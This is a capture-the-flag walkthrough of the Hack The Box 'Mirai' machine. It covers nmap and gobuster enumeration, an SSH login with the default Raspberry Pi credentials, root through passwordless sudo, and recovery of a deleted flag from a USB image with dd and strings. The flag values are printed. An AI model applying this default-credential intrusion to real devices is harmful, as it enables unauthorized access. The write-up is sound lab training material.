# Mirai

URL: https://app.hackthebox.com/machines/Mirai

Level: Easy

Date 17 Jul 2021

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Sat Jul 17 11:47:09 2021 as: nmap -p- -T4 -oN 01_nmap.txt 10.10.10.48
Nmap scan report for 10.10.10.48
Host is up (0.044s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
1513/tcp  open  fujitsu-dtc
32400/tcp open  plex
32469/tcp open  unknown

# Nmap done at Sat Jul 17 11:47:33 2021 -- 1 IP address (1 host up) scanned in 24.24 seconds
```

```
# Nmap 7.91 scan initiated Sat Jul 17 11:48:31 2021 as: nmap -p22,53,80,1513,32400,32469 -A -T4 -oN 02_nmap_withA.txt 10.10.10.48
Nmap scan report for 10.10.10.48
Host is up (0.043s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
53/tcp    open  domain  dnsmasq 2.76
| dns-nsid:
|_  bind.version: dnsmasq-2.76
80/tcp    open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
1513/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    Plex Media Server httpd
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
|_http-favicon: Plex
|_http-title: Unauthorized
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   43.21 ms 10.10.14.1
2   43.55 ms 10.10.10.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 17 11:48:58 2021 -- 1 IP address (1 host up) scanned in 28.51 seconds
```

We run `gobuster`:

```
/admin                (Status: 301) [Size: 0] [--> http://10.10.10.48:80/admin/]
/versions             (Status: 200) [Size: 18]
```

We discover that this is a Pi-Hole device.

# User-flag

We try access through SSH and default credentials (`pi:raspberry`) and we are in.

```
root@kali:/opt/htb/Mirai# ssh pi@10.10.10.48
pi@10.10.10.48's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.
```

So we can grab user flag:

```
pi@raspberrypi:~ $ cd Desktop/
pi@raspberrypi:~/Desktop $ ls
Plex  user.txt
pi@raspberrypi:~/Desktop $ cat user.txt
ff837707441b257a20e32199d7c8838d
```

# Privesc

We try some easy privesc technique:

```
pi@raspberrypi:~/Desktop $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
pi@raspberrypi:~/Desktop $ sudo bash
root@raspberrypi:/home/pi/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
```

Too easy, isn't it?

We try to grab root flag but:

```
root@raspberrypi:~# cat root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
```

We then look for some mounted USB device:

```
root@raspberrypi:~# cat /etc/fstab
# UNCONFIGURED FSTAB FOR BASE SYSTEM
aufs / aufs rw 0 0
tmpfs /tmp tmpfs nosuid,nodev 0 0
/dev/sdb /media/usbstick ext4 ro,suid,dev,noexec,auto,user,async 0 0
```


We found a file, but we are not done yet:

```
root@raspberrypi:~# cd /media/usbstick/
root@raspberrypi:/media/usbstick# ls
damnit.txt  lost+found
root@raspberrypi:/media/usbstick# cat damnit.txt
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

We try to dump device with `dd`:

```
root@raspberrypi:~# dd if=/dev/sdb of=/root/stick
20480+0 records in
20480+0 records out
10485760 bytes (10 MB) copied, 0.0980808 s, 107 MB/s
root@raspberrypi:~# ls -lh /root/stick
-rw-r--r-- 1 root root 10M Jul 17 13:29 /root/stick
root@raspberrypi:~# mv stick /home/pi/
root@raspberrypi:~# chown pi:pi /home/pi/stick
```

We transfer to our machine:

```
root@kali:/opt/htb/Mirai# strings stick
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```

Know we can recognize root flag string (`3d3e483143f.....`)








